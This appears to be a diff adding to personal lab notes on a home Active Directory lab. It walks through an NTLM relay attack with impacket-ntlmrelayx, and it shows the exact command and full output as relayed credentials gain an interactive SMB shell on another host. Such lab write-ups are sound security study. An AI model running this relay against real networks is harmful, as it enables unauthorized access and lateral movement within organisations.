@@ -191,4 +191,49 @@ Impacket v0.11.0 - Copyright 2023 Fortra
 [*] Servers started, waiting for connections
 ```
 
-- On Spiderman VM login with `marvel\pparker` and try connecting to random se
+- On Spiderman VM login with `marvel\pparker` and try connecting to random server
+
+![](assets/Pasted%20image%2020241217211048.png)
+
+- Check `impacket-ntlmrelayx`
+	- We can see `Authenticating against smb://192.168.0.3 as MARVEL/PPARKER FAILED` as `192.168.0.3` belongs to Spiderman VM.
+	- and `Authenticating against smb://192.168.0.4 as MARVEL/PPARKER SUCCEED` as `192.168.0.4` belongs to Ironman VM as it is relaying the attack.
+
+```
+┌─[hexadivine@parrot]─[/tmp]
+└──╼ $sudo impacket-ntlmrelayx -tf /tmp/targets.txt -smb2support  -i
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Protocol Client DCSYNC loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client LDAP loaded..
+[*] Protocol Client LDAPS loaded..
+[*] Protocol Client MSSQL loaded..
+[*] Protocol Client RPC loaded..
+[*] Protocol Client SMB loaded..
+[*] Protocol Client SMTP loaded..
+[*] Running in relay mode to hosts in targetfile
+[*] Setting up SMB Server
+[*] Setting up HTTP Server on port 80
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+[*] SMBD-Thread-5 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, attacking target smb://192.168.0.3
+[-] Authenticating against smb://192.168.0.3 as MARVEL/PPARKER FAILED
+[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, attacking target smb://192.168.0.4
+[*] Authenticating against smb://192.168.0.4 as MARVEL/PPARKER SUCCEED
+[*] Started interactive SMB client shell via TCP on 127.0.0.1:11000
+[*] SMBD-Thread-6 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, attacking target smb://192.168.0.3
+[-] Authenticating against smb://192.168.0.3 as MARVEL/PPARKER FAILED
+[*] SMBD-Thread-8 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, but there are no more targets left!
+[*] HTTPD(80): Client requested path: /0686ag6ka5
+[*] HTTPD(80): Client requested path: /0686ag6ka5
+[*] HTTPD(80): Client requested path: /0686ag6ka5
+[*] HTTPD(80): Connection from MARVEL/PPARKER@192.168.0.3 controlled, but there are no more targets left!
+[*] SMBD-Thread-11 (process_request_thread): Connection from MARVEL/PPARKER@192.168.0.3 controlled, but there are no more targets left!
+
+```
